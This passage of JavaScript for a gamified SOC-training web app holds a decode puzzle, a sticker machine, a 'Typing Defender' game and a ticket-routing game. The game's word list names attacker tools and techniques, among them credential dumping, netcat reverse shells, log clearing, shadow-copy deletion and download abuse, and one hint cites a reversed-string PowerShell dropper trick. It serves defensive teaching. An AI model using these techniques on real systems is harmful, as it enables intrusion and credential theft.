  {k:"url",enc:s=>Array.from(s,ch=>"%"+ch.charCodeAt(0).toString(16).toUpperCase().padStart(2,"0")).join(""),hint:"Lots of % followed by two hex characters. That's URL (percent) encoding.",how:"CyberChef 'URL Decode'. Attackers fully encode URLs to slip past filters."},
  {k:"reversed",enc:s=>s.split("").reverse().join(""),hint:"Read it backwards.",how:"PowerShell droppers love reversed strings: -join('...')[-1..-100]"}];
function decodeToday(){ const n=dayNum(); return {p:DECODE_PHRASES[n%DECODE_PHRASES.length],d:DECODE_KINDS[(n*7+3)%DECODE_KINDS.length]}; }
function renderDecode(){ const box=$("#decode"); if(!box) return; const {p,d}=decodeToday(), st=store.get("dec_"+todayKey(),{tries:0,done:false})||{tries:0,done:false};
  box.innerHTML=`<div class="codebox decode-str">${esc(d.enc(p))}</div>
    ${st.done?`<p class="ok-line">${ic("check")} Solved: <b>${esc(p)}</b>. ${esc(d.how)}</p>`:
      `<div class="row"><input class="search grow" id="decIn" placeholder="Your answer, in plain text" aria-label="Decoded answer" autocomplete="off"><button class="btn primary" id="decGo">Check</button></div>
       ${st.tries>0?`<p class="muted small">Hint: ${esc(d.hint)}</p>`:'<p class="muted small">No tools needed, but CyberChef is allowed. Wrong answers unlock a hint.</p>'}`}`;
  const go=()=>{ const v=($("#decIn").value||"").trim().toLowerCase().replace(/['’]/g,""); if(!v) return; const s=store.get("dec_"+todayKey(),{tries:0,done:false})||{tries:0,done:false};
    if(v===p.replace(/['’]/g,"")){ s.done=true; store.set("dec_"+todayKey(),s); earn(15,"decoded today's message"); sfx("chime"); }
    else { s.tries++; store.set("dec_"+todayKey(),s); sfx("thud"); toast("Not quite. A hint is now showing."); }
    renderDecode(); renderGame(); };
  if($("#decGo")){ $("#decGo").onclick=go; $("#decIn").onkeydown=e=>{ if(e.key==="Enter") go(); }; } }

/* ---------- sticker capsule machine ---------- */
var STICKERS=[
 {id:"dns",n:"It's always DNS",r:"c",c:"#5CE1C6",i:"cloud"},{id:"ptue",n:"Patch Tuesday veteran",r:"c",c:"#F5B841",i:"patch"},{id:"printer",n:"Printer whisperer",r:"c",c:"#8D93A8",i:"printer"},
 {id:"rof",n:"Read-only Friday",r:"c",c:"#7FB7EE",i:"lock"},{id:"3am",n:"3 AM club",r:"c",c:"#A9A1E8",i:"moon"},{id:"coffee",n:"Fuelled by coffee",r:"c",c:"#C9A77F",i:"brew"},
 {id:"isolate",n:"Have you tried isolating it?",r:"c",c:"#F2946B",i:"x"},{id:"sigma",n:"Sigma fan club",r:"c",c:"#5CE1C6",i:"scroll"},
 {id:"zt",n:"Zero trust, full coffee",r:"r",c:"#E8505B",i:"detect"},{id:"purple",n:"Purple teamer",r:"r",c:"#B07BD8",i:"users"},{id:"roast",n:"Kerberoast chef",r:"r",c:"#F2946B",i:"flame"},
 {id:"lp",n:"Least privilege lifestyle",r:"r",c:"#7FB7EE",i:"lock"},{id:"mfa",n:"Immune to MFA fatigue",r:"r",c:"#5CE1C6",i:"bolt"},
 {id:"log4",n:"Log4Shell survivor",r:"l",c:"#F5B841",i:"fame"},{id:"gold",n:"Golden 0-day",r:"l",c:"#FFD36B",i:"sparkle"},{id:"blue",n:"Blue team forever",r:"l",c:"#4F7BFF",i:"heart"}];
var RARITY={c:["common",70],r:["rare",25],l:["legendary",5]};
var stk=(o=>{ const s={}; if(o&&typeof o==="object") STICKERS.forEach(x=>{ const v=Math.floor(Number(o[x.id])||0); if(v>0) s[x.id]=Math.min(999,v); }); return s; })(store.get("stickers",{}));
function stickerArt(s,locked){ const fill=locked?"#2A3350":s.c, txt=locked?"?":"";
  const words=locked?["???"]:s.n.split(" "), lines=[]; let cur=""; words.forEach(w=>{ if((cur+" "+w).trim().length>14){ lines.push(cur.trim()); cur=w; } else cur+=" "+w; }); lines.push(cur.trim());
  return `<svg viewBox="0 0 100 100" class="sticker ${locked?'locked':''} r-${s.r}"><circle cx="50" cy="50" r="46" fill="#F7F3EA"/><circle cx="50" cy="50" r="41" fill="${fill}"/>
    ${s.r==="l"&&!locked?`<circle cx="50" cy="50" r="41" fill="url(#holo)" opacity=".45"/>`:""}
    <svg x="35" y="14" width="30" height="30" viewBox="0 0 24 24" class="st-ic">${locked?"":`<use href="#i-${s.i}"/>`}</svg>
    ${lines.slice(0,3).map((l,i)=>`<text x="50" y="${58+i*11-(lines.length-1)*3}" text-anchor="middle">${esc(l)}</text>`).join("")}${txt}</svg>`; }
function rollSticker(){ const a=new Uint32Array(2); crypto.getRandomValues(a); const roll=a[0]%100, tier=roll<5?"l":roll<30?"r":"c"; const pool=STICKERS.filter(s=>s.r===tier); return pool[a[1]%pool.length]; }
var machineBusy=false;
function renderMachine(){ const box=$("#machine"); if(!box) return; const owned=Object.keys(stk).length;
  box.innerHTML=`<div class="mach-art" id="machArt"><svg viewBox="0 0 120 160" aria-hidden="true"><defs><radialGradient id="glass" cx=".35" cy=".3"><stop offset="0" stop-color="#ffffff55"/><stop offset="1" stop-color="#ffffff08"/></radialGradient></defs>
      <circle cx="60" cy="52" r="44" fill="#0A1020" stroke="#3A4566" stroke-width="3"/>
      ${STICKERS.slice(0,12).map((s,i)=>`<circle class="cap" cx="${30+(i%4)*20+(Math.floor(i/4)%2)*8}" cy="${40+Math.floor(i/4)*17}" r="8" fill="${s.c}"/>`).join("")}
      <circle cx="60" cy="52" r="44" fill="url(#glass)"/><path d="M28 92h64l8 56H20z" fill="var(--alarm)"/><rect x="48" y="110" width="24" height="18" rx="3" fill="#0A1020"/><circle class="knob" cx="60" cy="102" r="7" fill="var(--sodium)"/></svg>
      <div class="drop-cap" id="dropCap"></div></div>
    <div><p>Every capsule holds one sticker. There are ${STICKERS.length} to collect: commons, rares, and a few holographic legendaries.</p>
      <p class="muted small">Duplicates refund 5 beans. You own ${owned} of ${STICKERS.length}.</p>
      <button class="btn primary" id="machGo" ${beans<25||machineBusy?"disabled":""}>${ic("refresh")}Turn the handle for 25 beans</button><div id="machOut" class="mach-out"></div></div>`;
  $("#machGo").onclick=()=>{ if(machineBusy||!spend(25)) return; machineBusy=true; $("#machGo").disabled=true; const s=rollSticker(), isNew=!stk[s.id];
    stk[s.id]=(stk[s.id]||0)+1; store.set("stickers",stk); const art=$("#machArt"); art.classList.add("shake-m"); sfx("whoosh"); clatter(500);
    setTimeout(()=>{ art.classList.remove("shake-m"); const dc=$("#dropCap"); dc.style.background=s.c; dc.classList.add("go"); sfx("pop"); },650);
    setTimeout(()=>{ if(!isNew) earn(5,"duplicate refund",true); $("#machOut").innerHTML=`<div class="reveal r-${s.r}">${stickerArt(s)}<div><b>${esc(s.n)}</b><p class="muted small">${RARITY[s.r][0]}${isNew?", new to your album":", duplicate, 5 beans back"}</p></div></div>`;
      sfx(s.r==="l"?"chime":"coin"); if(s.r==="l") toast("Legendary sticker! Holographic and everything."); machineBusy=false; renderMachine(); $("#machOut").innerHTML=`<div class="reveal r-${s.r}">${stickerArt(s)}<div><b>${esc(s.n)}</b><p class="muted small">${RARITY[s.r][0]}${isNew?", new to your album":", duplicate, 5 beans back"}</p></div></div>`; renderAlbum(); renderGame(); },1500); }; }
function renderAlbum(){ const box=$("#album"); if(!box) return; $("#albumCount").textContent=`${Object.keys(stk).length} of ${STICKERS.length}`;
  box.innerHTML=STICKERS.map(s=>`<div class="albumi" title="${stk[s.id]?esc(s.n):"Not found yet"}">${stickerArt(s,!stk[s.id])}${stk[s.id]>1?`<span class="cnt">x${stk[s.id]}</span>`:""}</div>`).join(""); }

/* ---------- arcade game 5: Typing Defender ---------- */
var TD_WORDS=[["certutil","Built-in tool abused to download files"],["mimikatz","Credential dumping tool"],["psexec","Remote execution, common in lateral movement"],["vssadmin","Deleting shadow copies is ransomware prep"],
 ["rundll32","Runs DLLs, abused to launch payloads"],["mshta","Runs HTA files, abused for script execution"],["lsass","The process attackers dump for credentials"],["beacon","Malware checking in with its C2 server"],
 ["kerberoast","Cracking service tickets offline"],["bloodhound","Maps attack paths through Active Directory"],["wevtutil","Can clear Windows event logs"],["bitsadmin","BITS jobs abused for downloads"],
 ["schtasks","Scheduled tasks for persistence"],["regsvr32","Abused to run remote scriptlets"],["netcat","Raw network connections, reverse shells"],["xmrig","Cryptominer dropped by attackers"],
 ["phish","Still the number one way in"],["exfil","Data leaving the building"],["ransom","Encrypt, extort, repeat"],["sqlmap","Automated SQL injection tool"],["nmap","Network scanner: whose scan is this?"],["cobalt","Cobalt Strike, a favourite C2 framework"]];
GAMES.TD={e:"keyboard",n:"Typing Defender",how:"Attacker tools fall toward your firewall. Type a word to stop it. Three breaches and you're out. 60 seconds. Every word comes with a one-line lesson."};
GAME_IC.TD="keyboard";
function gameTD(r,done){
  const area=$("#gameArea");
  area.innerHTML=hud([["lives","tdL",3],["score","tdS",0],["time","tdT",60]])+`<canvas id="tdc" class="gcanvas"></canvas><p class="typed" id="tdTyped" aria-live="polite">Start typing</p><p class="muted small" id="tdMsg"></p>`;
  const c=$("#tdc"), x=c.getContext("2d"); let W=0,H=0; (function(){ const b=c.getBoundingClientRect(), d=window.devicePixelRatio||1; W=b.width; H=b.height; c.width=W*d; c.height=H*d; x.setTransform(d,0,0,d,0,0); })();
  const seq=[]; let t=600; for(let i=0;i<90;i++){ t+=Math.max(700,2300-i*28)+r()*500; const w=TD_WORDS[Math.floor(r()*TD_WORDS.length)]; seq.push({t,w:w[0],def:w[1],x:.08+r()*.72,sp:.035+i*.0007+r()*.012}); }
  let st=performance.now(), last=st, si=0, words=[], typed="", lives=3, score=0, over=false, raf=0, hits=0, shake=0, sparks=[]; const met=new Map();
  function key(e){ if(over||e.metaKey||e.ctrlKey||e.altKey) return; const k=e.key.toLowerCase();
    if(k==="backspace"){ typed=typed.slice(0,-1); e.preventDefault(); }
    else if(/^[a-z0-9]$/.test(k)){ e.preventDefault(); sfx2("key"); const nt=typed+k; const target=words.filter(w=>w.w.startsWith(nt)).sort((a,b)=>b.y-a.y)[0];
      if(!target){ typed=""; sfx("thud"); $("#tdMsg").textContent="Typo. Buffer cleared."; }
      else { typed=nt; if(target.w===typed){ words.splice(words.indexOf(target),1); score+=target.w.length*10; hits++; met.set(target.w,target.def); typed="";
          for(let i=0;i<14;i++) sparks.push({x:target.px,y:target.y,vx:(Math.random()-.5)*.4,vy:(Math.random()-.8)*.4,a:1}); sfx("pop"); $("#tdMsg").textContent=`${target.w}: ${target.def}`; } } }
    $("#tdTyped").textContent=typed||"Start typing"; $("#tdS").textContent=score; }
  document.addEventListener("keydown",key);
  function frame(now){ if(over) return; const el=now-st, dt=Math.min(50,now-last); last=now;
    while(si<seq.length&&seq[si].t<=el){ const s=seq[si++]; words.push(Object.assign({},s,{y:-10})); }
    x.clearRect(0,0,W,H); x.save(); if(shake>0){ x.translate((Math.random()-.5)*shake,0); shake*=.85; }
    const fy=H-34; const g=x.createLinearGradient(0,fy-30,0,fy); g.addColorStop(0,"transparent"); g.addColorStop(1,"#5CE1C633"); x.fillStyle=g; x.fillRect(0,fy-30,W,30);
    x.strokeStyle="#5CE1C6"; x.lineWidth=2; x.beginPath(); x.moveTo(0,fy); x.lineTo(W,fy); x.stroke();
    x.font="600 16px JetBrains, ui-monospace, monospace"; x.textBaseline="middle";
    words.forEach(w=>{ w.y+=w.sp*dt; w.px=w.x*W; const tw=x.measureText(w.w).width, isT=typed&&w.w.startsWith(typed);
      x.fillStyle=isT?"#1F3A40":"#141B2E"; x.strokeStyle=isT?"#5CE1C6":"#33406A"; x.beginPath(); x.roundRect(w.px-8,w.y-14,tw+16,28,6); x.fill(); x.stroke();
      if(isT){ x.fillStyle="#5CE1C6"; x.fillText(typed,w.px,w.y); x.fillStyle="#E6E3D9"; x.fillText(w.w.slice(typed.length),w.px+x.measureText(typed).width,w.y); }
      else { x.fillStyle="#E6E3D9"; x.fillText(w.w,w.px,w.y); } });
    words=words.filter(w=>{ if(w.y<fy-14) return true; lives--; shake=10; sfx("thud"); $("#tdMsg").textContent=`${w.w} got through the firewall.`; if(typed&&w.w.startsWith(typed)) typed=""; return false; });
    sparks=sparks.filter(s=>{ s.x+=s.vx*dt; s.y+=s.vy*dt; s.vy+=.0009*dt; s.a-=dt/600; x.globalAlpha=Math.max(0,s.a); x.fillStyle="#F5B841"; x.fillRect(s.x,s.y,3,3); x.globalAlpha=1; return s.a>0; });
    x.restore();
    const left=Math.max(0,60-el/1000); $("#tdT").textContent=left.toFixed(0); $("#tdL").textContent=Math.max(0,lives);
    if(lives<=0||left<=0){ finish(); return; } raf=requestAnimationFrame(frame); }
  function finish(){ over=true; cancelAnimationFrame(raf); document.removeEventListener("keydown",key);
    const learned=[...met.entries()].slice(0,4).map(([w,d])=>`<b>${esc(w)}</b>: ${esc(d)}`).join("<br>");
    done(score+Math.max(0,lives)*50,`Stopped <b>${hits}</b> tools with ${Math.max(0,lives)} lives left.${learned?"<br><br>"+learned:""}`); }
  raf=requestAnimationFrame(frame);
  return {stop(){ over=true; cancelAnimationFrame(raf); document.removeEventListener("keydown",key); }};
}

/* ---------- extra badges ---------- */
BADGES.push(["sparkle","Sticker collector","Collect 8 different stickers",()=>Object.keys(stk).length>=8],["fame","Full album","Collect every sticker",()=>Object.keys(stk).length>=STICKERS.length],
  ["key","Codebreaker","Solve a decode of the day",()=>Object.keys(allData()).some(k=>/^fpc_dec_/.test(k)&&(store.get(k.slice(4),{})||{}).done)],["keyboard","Fast fingers","Score 1,000 in Typing Defender",()=>Object.keys(allData()).some(k=>/^fpc_lb_TD-/.test(k)&&lbGet(k.slice(7)).some(x=>x.me&&x.s>=1000))]);

function v7Init(){ renderDecode(); renderMachine(); renderAlbum(); renderMascot();
  window.addEventListener("hashchange",()=>{ if(location.hash==="#shop") renderMachine(); if(location.hash==="#me") renderAlbum(); if(location.hash==="#socdle") renderDecode(); }); }

/* ======================= v8: THE DESK — a small SOC, its people, its tools ======================= */

/* ---------- more sounds (all synthesised) ---------- */
function sfx2(name){ if(!Snd.sfx||!sndInit()) return; const c=Snd.ctx; if(c.state==="suspended") c.resume(); const t=c.currentTime;
  const nz=(f,q,d,p,w,type)=>burst(f,q,d,p,null,w,type);
  switch(name){
    case "boss": { // muffled angry boss through the office wall: wah-wah syllables
      const n=5+Math.floor(Math.random()*4); let tt=t;
      for(let i=0;i<n;i++){ const dur=.11+Math.random()*.16, o=c.createOscillator(), f1=c.createBiquadFilter(), f2=c.createBiquadFilter(), g=c.createGain();
        o.type="sawtooth"; const p=120+Math.random()*70; o.frequency.setValueAtTime(p*1.25,tt); o.frequency.exponentialRampToValueAtTime(p,tt+dur);
        f1.type="bandpass"; f1.Q.value=5; f1.frequency.setValueAtTime(500,tt); f1.frequency.linearRampToValueAtTime(900+Math.random()*500,tt+dur*.5); f1.frequency.linearRampToValueAtTime(400,tt+dur);
        f2.type="lowpass"; f2.frequency.value=1800; env(g,tt,.02,.32,dur); o.connect(f1).connect(f2).connect(g).connect(Snd.fx); o.start(tt); o.stop(tt+dur+.05); tt+=dur+.04+Math.random()*.05; }
      break; }
    case "coffee": { // grinder, then steam, then drips
      const s=c.createBufferSource(); s.buffer=Snd.white||(Snd.white=noiseBuf("white",1)); s.loop=true; const bp=c.createBiquadFilter(); bp.type="bandpass"; bp.frequency.value=900; bp.Q.value=1.2;
      const am=c.createOscillator(), amg=c.createGain(), g=c.createGain(); am.frequency.value=34; amg.gain.value=.12; am.connect(amg).connect(g.gain); g.gain.value=.15;
      s.connect(bp).connect(g).connect(Snd.fx); s.start(t); s.stop(t+1.4); am.start(t); am.stop(t+1.4);
      const st=c.createBufferSource(); st.buffer=Snd.white; st.loop=true; const hp=c.createBiquadFilter(); hp.type="highpass"; hp.frequency.value=3500; const sg=c.createGain(); env(sg,t+1.5,.3,.12,1.4);
      st.connect(hp).connect(sg).connect(Snd.fx); st.start(t+1.5); st.stop(t+3.3);
      for(let i=0;i<5;i++) tone("sine",1400+Math.random()*500,600,.09,.12,null,t+3.3+i*.22); break; }
    case "ring": for(let r=0;r<2;r++){ [440,480].forEach(f=>{ const o=c.createOscillator(), g=c.createGain(), lfo=c.createOscillator(), lg=c.createGain(); o.frequency.value=f; lfo.frequency.value=20; lg.gain.value=.03; lfo.connect(lg).connect(g.gain); g.gain.setValueAtTime(.0001,t+r*.9); g.gain.linearRampToValueAtTime(.04,t+r*.9+.02); g.gain.setValueAtTime(.04,t+r*.9+.55); g.gain.linearRampToValueAtTime(.0001,t+r*.9+.6); o.connect(g).connect(Snd.fx); o.start(t+r*.9); o.stop(t+r*.9+.62); lfo.start(t+r*.9); lfo.stop(t+r*.9+.62); }); } break;
    case "knock": for(let i=0;i<3;i++){ tone("sine",160,70,.09,.45,null,t+i*.16); nz(700,2,.03,.25,t+i*.16); } break;
    case "ping": tone("sine",1046.5,null,.12,.14); tone("sine",1568,null,.2,.12,null,t+.09); break;
    case "bleep": tone("sine",1000,null,.32,.12); break;
    case "key": nz(2500+Math.random()*1500,2,.012,.14); break;
    case "jam": tone("sawtooth",70,55,.5,.12); nz(300,1,.5,.15,null,"lowpass"); break;
  } }

/* ---------- people ---------- */
function avatar(a,size){ const s=size||48;
  const hair={short:`<path d="M13 21c0-8 5-12 11-12s11 4 11 12c-2-4-6-6-11-6s-9 2-11 6z" fill="${a.hair}"/>`,
    long:`<path d="M12 23c0-9 5-14 12-14s12 5 12 14v10h-4V22c-2-4-5-6-8-6s-6 2-8 6v11h-4z" fill="${a.hair}"/>`,
    bun:`<circle cx="24" cy="7" r="4" fill="${a.hair}"/><path d="M13 21c0-8 5-12 11-12s11 4 11 12c-2-4-6-6-11-6s-9 2-11 6z" fill="${a.hair}"/>`,
    bald:`<path d="M15 16c2-4 5-6 9-6" stroke="#ffffff33" stroke-width="2" fill="none"/>`,
    cap:`<path d="M12 18c0-6 5-10 12-10s12 4 12 10z" fill="${a.hair}"/><path d="M30 17h10v2H30z" fill="${a.hair}"/>`}[a.style]||"";
  const acc={glasses:`<circle cx="20" cy="22" r="3.4" fill="none" stroke="#1B1F2B" stroke-width="1.3"/><circle cx="28" cy="22" r="3.4" fill="none" stroke="#1B1F2B" stroke-width="1.3"/><path d="M23.4 22h1.2" stroke="#1B1F2B" stroke-width="1.3"/>`,
    headset:`<path d="M12 22a12 12 0 0 1 24 0" stroke="#2A2E3A" stroke-width="2" fill="none"/><rect x="10" y="20" width="4" height="7" rx="2" fill="#2A2E3A"/><path d="M14 26q2 5 7 5" stroke="#2A2E3A" stroke-width="1.4" fill="none"/>`,
    tie:`<path d="M24 37l-2 3 2 8 2-8z" fill="#E8505B"/>`,hoodie:`<path d="M14 36q10 6 20 0" stroke="#ffffff33" stroke-width="2" fill="none"/>`}[a.acc]||"";
  return `<svg viewBox="0 0 48 48" width="${s}" height="${s}" class="avatar" aria-hidden="true"><circle cx="24" cy="24" r="24" fill="${a.bg}"/><path d="M6 48c2-10 9-14 18-14s16 4 18 14z" fill="${a.shirt}"/>
    <circle cx="24" cy="22" r="11" fill="${a.skin}"/>${hair}<circle cx="20" cy="22" r="1.3" fill="#1B1F2B"/><circle cx="28" cy="22" r="1.3" fill="#1B1F2B"/>
    <path d="${a.mood==="angry"?"M20 29q4-3 8 0":a.mood==="smug"?"M20 28q4 2 8-1":"M20 28q4 3 8 0"}" stroke="#1B1F2B" stroke-width="1.4" fill="none" stroke-linecap="round"/>${a.mood==="angry"?`<path d="M17 18l5 2M31 18l-5 2" stroke="#1B1F2B" stroke-width="1.5" stroke-linecap="round"/>`:""}${acc}</svg>`; }
var CAST={
  kevin:{n:"Kevin",t:"Finance",a:{bg:"#2A3350",skin:"#F1C9A5",hair:"#6B4423",style:"short",acc:"glasses",shirt:"#7FB7EE"},q:"Clicks everything. Means well."},
  dave:{n:"Dave",t:"IT service desk",a:{bg:"#1F3A40",skin:"#D8A27C",hair:"#2A1A12",style:"short",acc:"headset",shirt:"#5CE1C6"},q:"Will try to give you printers."},
  priya:{n:"Priya",t:"Network team",a:{bg:"#3A2350",skin:"#B67B55",hair:"#1B1210",style:"long",acc:"none",shirt:"#A9A1E8"},q:"It's not the firewall. It's never the firewall."},
  ciso:{n:"The CISO",t:"Corner office",a:{bg:"#3A1F24",skin:"#EBC3A0",hair:"#8D93A8",style:"bald",acc:"tie",shirt:"#2A2E3A"},q:"Has a board meeting in one hour. Always."},
  helen:{n:"Helen",t:"HR",a:{bg:"#3A3020",skin:"#F4D2B5",hair:"#C98F1E",style:"bun",acc:"none",shirt:"#F2946B"},q:"Trusts anyone who sounds polite on the phone."},
  dan:{n:"Dan",t:"Developer",a:{bg:"#202A3A",skin:"#E3B48F",hair:"#3B2A20",style:"short",acc:"hoodie",shirt:"#3A4566"},q:"It works on his machine."},
  marco:{n:"Marco",t:"Facilities",a:{bg:"#2A3A20",skin:"#C68C64",hair:"#E8505B",style:"cap",acc:"none",shirt:"#8FD5A6"},q:"Knows where every cable goes. Not which ones matter."},
  sam:{n:"Sam",t:"The intern",a:{bg:"#3A2A40",skin:"#F0CDB0",hair:"#5A3A2A",style:"long",acc:"glasses",shirt:"#F5B841"},q:"Enthusiastic. Has admin ideas."},
  vendor:{n:"Brad",t:"A vendor",a:{bg:"#2A2A2A",skin:"#F1C9A5",hair:"#D9B26A",style:"short",acc:"tie",shirt:"#1C1F27"},q:"Just wants 15 minutes of your time."}};

/* ---------- tickets ---------- */
var ROUTES=[["soc","Ours"],["it","Bounce to IT"],["net","Bounce to Network"],["ir","Escalate to IR"],["close","Close it, with a lesson"]];
var TICKETS=[
 {f:"kevin",ch:"walk",m:"My mouse is moving really slowly today. Is it a hacker?",a:"it",w:"A slow mouse is hardware or drivers. Call us if it starts moving by itself."},
 {f:"kevin",ch:"email",m:"Got an invoice from a supplier we don't use. Opened it to check. It asked me to enable macros, so I did. Nothing happened?",a:"soc",w:"Enabled macros on an unknown invoice is a likely infection. Isolate the laptop and investigate."},
 {f:"helen",ch:"phone",m:"I'm locked out of my account. Can you reset my password?",a:"it",w:"Password resets are the service desk's job. The SOC only cares if the lockout looks like an attack."},
 {f:"priya",ch:"chat",m:"Lots of outbound traffic from the file server to an IP I don't know, every 60 seconds, since 3 AM. Before you ask: the firewall is fine.",a:"soc",w:"A perfectly timed beacon from a server is a classic C2 sign. That's ours."},
 {f:"dan",ch:"chat",m:"Can you whitelist my laptop in the EDR? It keeps killing my mimikatz. I'm only testing.",a:"soc",w:"A security exception request for a credential dumper. Ours, and the answer is almost certainly no."},
 {f:"ciso",ch:"email",m:"Board meeting in 1 hour. Need one slide: are we safe from the thing on the news?",a:"soc",w:"Exposure questions about a threat are exactly what the SOC answers. Keep it to one slide."},
 {f:"kevin",ch:"phone",m:"The Wi-Fi in meeting room B is slow again.",a:"net",w:"Slow Wi-Fi is a network problem, not a security one."},
 {f:"sam",ch:"chat",m:"I accidentally ran nmap against the whole office subnet. Is that bad?",a:"close",w:"Not an incident, but a teachable moment: no scanning without approval, and tell the SOC first next time."},
 {f:"helen",ch:"phone",m:"Someone from 'IT support' called and asked for my MFA code. I gave it to him, he sounded so nice.",a:"soc",w:"That's account compromise via vishing. Revoke sessions, reset credentials, check for MFA device changes. Now."},
 {f:"dave",ch:"chat",m:"Printer on floor 2 says PC LOAD LETTER. You guys handle printers, right?",a:"it",w:"Dave is trying to give you printers again. Bounce it straight back."},
 {f:"dan",ch:"email",m:"Pushed our AWS keys to a public GitHub repo by accident. I deleted the commit, so we're fine?",a:"soc",w:"Bots scrape public repos within minutes, and the commit history remembers. Rotate the keys and check the account for abuse."},
 {f:"kevin",ch:"walk",m:"Found a USB stick in the car park labelled 'Salaries 2026'. I plugged it in to find the owner.",a:"soc",w:"The oldest trick in the book. Isolate the machine, grab the USB, investigate."},
 {f:"vendor",ch:"email",m:"Quick 15-minute call to show how our AI platform eliminates 100% of your alerts?",a:"close",w:"If something eliminates 100% of alerts, it's called unplugging the SIEM. Close it."},
 {f:"helen",ch:"walk",m:"Can I install this free PDF converter I found? It's free!",a:"it",w:"Software requests go to IT, who check it against the approved list. Free software is often paid for in malware."},
 {f:"dave",ch:"phone",m:"Three servers just showed ransom notes. Files are being renamed to .locked. It's spreading.",a:"ir",w:"Active ransomware is a full incident. Escalate to IR and start containment immediately."},
 {f:"ciso",ch:"walk",m:"Why did the SIEM bill go up 40% this month?",a:"soc",w:"Ingestion is the SOC's job, so is the bill. Probably someone turned on debug logging on the firewall. Hi Priya."},
 {f:"kevin",ch:"walk",m:"My password expired. Can I just use Password2026! ? It has a symbol and everything.",a:"close",w:"Season or word plus year plus a symbol is the first thing attackers try. Teach him passphrases."},
 {f:"priya",ch:"chat",m:"VPN is down for the Singapore office.",a:"net",w:"VPN outages are Network's. Unless it went down because someone is attacking it, in which case call us back."},
 {f:"marco",ch:"phone",m:"Server room is very warm and something is beeping.",a:"it",w:"Hot server rooms are an IT and facilities emergency, not a security one. Tell them quickly though."},
 {f:"helen",ch:"email",m:"The CEO emailed asking me to buy 20 gift cards urgently and keep it quiet. Should I use my card or the company one?",a:"soc",w:"Classic CEO-fraud email. Block the sender, warn the company, thank Helen for asking first."},
 {f:"kevin",ch:"email",m:"I reported a phishing email, then clicked the link to see if it was really phishing. It was!",a:"soc",w:"Reporting was great. Clicking was not. Check what he entered and what the link did."},
 {f:"ciso",ch:"phone",m:"A journalist says our customer database is for sale on a forum. Comment by 5 PM?",a:"ir",w:"A possible data breach with media attention is a full incident: IR, legal and comms, now."},
 {f:"dave",ch:"chat",m:"User says their PC is slow. Can you run a virus scan for them? We're swamped.",a:"it",w:"A slow PC with no other signs is IT's. The EDR is already scanning anyway."},
 {f:"priya",ch:"walk",m:"The new firewall rules are blocking the SIEM collector. Not my fault, the rules were approved.",a:"net",w:"It is, in fact, the firewall this time. Network fixes the rule. Enjoy the moment."},
 {f:"sam",ch:"walk",m:"Can I get domain admin? It would make my job so much easier.",a:"close",w:"Least privilege: nobody gets domain admin for convenience. Especially the intern."},
 {f:"kevin",ch:"phone",m:"I wrote my password on a sticky note, but I put it under the keyboard, so it's hidden.",a:"close",w:"Under the keyboard is the second place everyone looks. Introduce Kevin to a password manager."},
 {f:"dan",ch:"chat",m:"Prod is down! Is it a DDoS? Also, I deployed five minutes ago, if that matters.",a:"close",w:"Traffic is normal and he just deployed. Not a DDoS. Send him back to his rollback button."},
 {f:"marco",ch:"walk",m:"There's someone in a hi-vis vest in the server room. Says he's fixing the air con. Didn't sign in.",a:"soc",w:"Unescorted, unsigned visitor in a secure room is a physical security incident. Ours, and quickly."}];
var WRONG={soc:"You took it on. An hour later it turns out this was never ours.",it:"Dave bounces it right back: 'Nice try. This is clearly security.'",net:"Priya bounces it back: 'It's not the firewall. It's never the firewall.'",
  ir:"The IR team: 'You woke us up for this?'",close:"You closed it. It got worse. Now the CISO knows."};
var CISO_LINES=["Why is this on my desk?","Who closed that ticket?","I'm getting calls from the board.","I said ONE slide.","Is this the thing from the news? Tell me it isn't the thing from the news.","We have a tool for this. Several, in fact. Very expensive ones."];
var CISO_STATES=[[80,"Calm, sipping tea"],[60,"Mildly concerned"],[40,"Typing in all caps"],[20,"Walking over to your desk"],[0,"Board meeting energy"]];
var CH_LABEL={walk:"walk-in",phone:"phone call",chat:"chat",email:"email"};
var CH_SOUND={walk:"knock",phone:"ring",chat:"ping",email:"ping"};

function deskState(){ const d=store.get("desk_"+todayKey(),null); const ok=d&&typeof d==="object";
  return {q:ok&&Array.isArray(d.q)?d.q.filter(i=>Number.isInteger(i)&&i>=0&&i<TICKETS.length).slice(0,6):[], right:ok?Math.floor(fin(d.right)):0, wrong:ok?Math.floor(fin(d.wrong)):0,
    bounced:ok?Math.floor(fin(d.bounced)):0, mood:ok?clamp(fin(d.mood,75)):75, seen:ok&&Array.isArray(d.seen)?d.seen.filter(Number.isInteger).slice(-60):[], last:ok?String(d.last||""):""}; }
var desk=deskState(), deskNext=Date.now()+45000;
function deskSave(){ store.set("desk_"+todayKey(),desk); }
function pickTicket(){ const pool=TICKETS.map((t,i)=>i).filter(i=>!desk.q.includes(i)&&!desk.seen.slice(-14).includes(i)); return pool.length?pool[Math.floor(Math.random()*pool.length)]:Math.floor(Math.random()*TICKETS.length); }
function addTicket(quiet){ if(desk.q.length>=6) return; const i=pickTicket(); desk.q.push(i); deskSave(); const t=TICKETS[i], p=CAST[t.f];
  if(!quiet){ sfx2(CH_SOUND[t.ch]); toast(`New ${CH_LABEL[t.ch]}: ${p.n}, ${p.t}`); } renderDesk(); }
setInterval(()=>{ if(document.hidden||Date.now()<deskNext) return; deskNext=Date.now()+(60+Math.random()*90)*1000; addTicket(false); },15000);
function cisoState(){ return CISO_STATES.find(s=>desk.mood>=s[0])||CISO_STATES[CISO_STATES.length-1]; }
function renderDesk(){
  const n=desk.q.length, nb=$("#deskCount"); if(nb){ nb.textContent=n; nb.hidden=!n; }
  if(!$("#deskQueue")) return;
  const st=cisoState(), cm=Object.assign({},CAST.ciso.a,{mood:desk.mood<40?"angry":desk.mood>75?"smug":"ok"});
  $("#cisoBox").innerHTML=`<div class="ciso ${desk.mood<40?"hot":""}">${avatar(cm,72)}<div><p class="ciso-st">${esc(st[1])}</p><div class="bar ciso-bar"><i data-w="${desk.mood}"></i></div><p class="muted small">${desk.last?esc(desk.last):"Quiet so far. Don't say it out loud."}</p></div></div>`;
  applyW($("#cisoBox")); $("#cisoBox .ciso-bar i").classList.toggle("bad",desk.mood<40);
  $("#deskStats").innerHTML=`<div><b>${desk.right}</b><span>routed right</span></div><div><b>${desk.bounced}</b><span>bounced away</span></div><div><b>${desk.wrong}</b><span>came back</span></div><div><b>${swear.n}</b><span>in the swear jar</span></div>`;
  $("#deskQueue").innerHTML=n?desk.q.map((ti,k)=>{ const t=TICKETS[ti], p=CAST[t.f];
